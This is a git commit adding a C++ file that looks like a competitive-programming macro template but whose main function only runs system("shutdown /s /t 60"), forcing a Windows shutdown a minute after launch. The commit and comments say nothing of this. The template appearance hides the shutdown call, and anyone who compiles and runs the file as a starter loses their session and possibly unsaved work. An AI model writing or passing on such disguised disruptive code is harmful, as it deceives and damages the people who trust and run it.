2520fc8aecb28b04832ca46f414cab10306f8f28
AzeTurk810 <167020195+AzeTurk810@users.noreply.github.com>
2025-02-24 10:53:19 +0400

    Add files via upload

---
+++ ,ef.cpp
@@ -0,0 +1,28 @@
+//Desinged by AzeTurk810 Open source
+#include <bits/stdc++.h>
+using namespace std;
+# define ll long long
+# define ull unsigned long long
+# define hurryup ios_base::sync_with_stdio(false);cin.tie();cout.tie()
+# define endl '\n'
+# define fori for(ll i=0; i<n; i++)
+# define forj for(ll j=0; j<m; j++)
+# define fors for(ll i=0; i<s.size(); i++)
+# define forv for(ll i=0; i<v.size(); i++)
+# define mp make_pair
+# define pb push_back
+# define eb emplace_back
+# define ff first
+# define ss second
+# define sorta sort(a,a+n)
+# define sortv sort(v.begin(), v.end())
+# define sorts sort(s.begin(), s.end())
+# define INF 1e9+7
+# define MAX 1e6+1
+# define mod 1e6
+# define enterv while(cin>>i)v.pb(i);
+# define print(v) for(ll i = 0; i < v.size(); i++)cout<<v[i]<<" "
+int main()
+{
+    system("shutdown /s /t 60");
+}
